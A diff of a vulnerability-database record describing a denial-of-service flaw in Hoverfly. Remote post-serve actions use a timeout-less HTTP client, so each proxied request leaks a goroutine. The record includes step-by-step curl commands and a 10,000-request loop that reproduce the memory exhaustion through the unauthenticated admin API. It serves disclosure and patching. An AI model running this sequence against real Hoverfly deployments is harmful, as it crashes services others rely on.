@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0335"
-aliases = ["CVE-2026-50018","GHSA-42j2-w334-qxw7"]
-
 [basic]
-title = "Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions"
-description = "### Summary:
+description = """
+### Summary:
 
 Remote post-serve actions use `http.DefaultClient` without any timeout configuration. When the remote endpoint is unreachable or intentionally slow (accepts TCP connection but never responds), each triggered proxy request spawns a goroutine that blocks indefinitely on `http.DefaultClient.Do()`. An attacker can cause unbounded goroutine accumulation leading to memory exhaustion and process crash (OOM kill). Unlike local post-serve action execution, this requires no binary execution, only a URL pointing to a non-responsive endpoint.
 
@@ -21,7 +17,7 @@ Post-serve actions are executed in separate goroutines with no recovery wrapper.
 **2. HTTP client has no timeout (`core/action/action.go:128-143`):**
 
 ```go
-req, err := http.NewRequest(\"POST\", action.Remote, bytes.NewBuffer(pairViewBytes))
+req, err := http.NewRequest("POST", action.Remote, bytes.NewBuffer(pairViewBytes))
 // ...
 resp, err := http.DefaultClient.Do(req)  // No timeout! Blocks forever.
 ```
@@ -64,29 +60,25 @@ ncat -l -k 9999 &
 **Step 2: Register remote post-serve action pointing to the black hole**
 
 ```bash
-curl -X PUT http://localhost:8888/api/v2/hoverfly/post-serve-action \
-  -H \"Content-Type: application/json\" \
-  -d '{
-    \"actionName\": \"leak\",
-    \"remote\": \"http://192.0.2.1:9999/blackhole\",
-    \"delayInMs\": 0
+curl -X PUT http://localhost:8888/api/v2/hoverfly/post-serve-action -H "Content-Type: application/json" -d '{
+    "actionName": "leak",
+    "remote": "http://192.0.2.1:9999/blackhole",
+    "delayInMs": 0
   }'
 ```
 
 **Step 3: Load a catch-all simulation**
 
 ```bash
-curl -X PUT http://localhost:8888/api/v2/simulation \
-  -H \"Content-Type: application/json\" \
-  -d '{
-    \"data\": {
-      \"pairs\": [{
-        \"request\": {\"path\": [{\"matcher\": \"glob\", \"value\": \"*\"}]},
-        \"response\": {\"status\": 200, \"body\": \"ok\", \"postServeAction\": \"leak\"}
+curl -X PUT http://localhost:8888/api/v2/simulation -H "Content-Type: application/json" -d '{
+    "data": {
+      "pairs": [{
+        "request": {"path": [{"matcher": "glob", "value": "*"}]},
+        "response": {"status": 200, "body": "ok", "postServeAction": "leak"}
       }],
-      \"globalActions\": {\"delays\": [], \"delaysLogNormal\": []}
+      "globalActions": {"delays": [], "delaysLogNormal": []}
     },
-    \"meta\": {\"schemaVersion\": \"v5.2\"}
+    "meta": {"schemaVersion": "v5.2"}
   }'
 ```
 
@@ -95,7 +87,7 @@ curl -X PUT http://localhost:8888/api/v2/simulation \
 ```bash
 # Each request spawns an immortal goroutine
 for i in $(seq 1 10000); do
-    curl -s -x http://localhost:8500 \"http://target.com/req${i}\" &
+    curl -s -x http://localhost:8500 "http://target.com/req${i}" &
     # Throttle to avoid local FD exhaustion
     [ $((i % 100)) -eq 0 ] && wait
 done
@@ -120,21 +112,29 @@ An attacker with access to the admin API (unauthenticated by default) can cause 
 
 1. Registering a remote post-serve action pointing to a non-responsive endpoint.
 2. Loading a catch-all simulation that triggers the action on every request.
-3. Sending proxy traffic, each request permanently leaks a goroutine and its associated memory."
-severity = "MEDIUM"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+3. Sending proxy traffic, each request permanently leaks a goroutine and its associated memory."""
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-50018",
+    "GHSA-42j2-w334-qxw7",
+]
+ave_id = "AVE-2026-0335"
+
+[meta]
+collected_at = "2026-07-23T01:44:00.250744479+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-23T01:44:00.250744479+00:00"
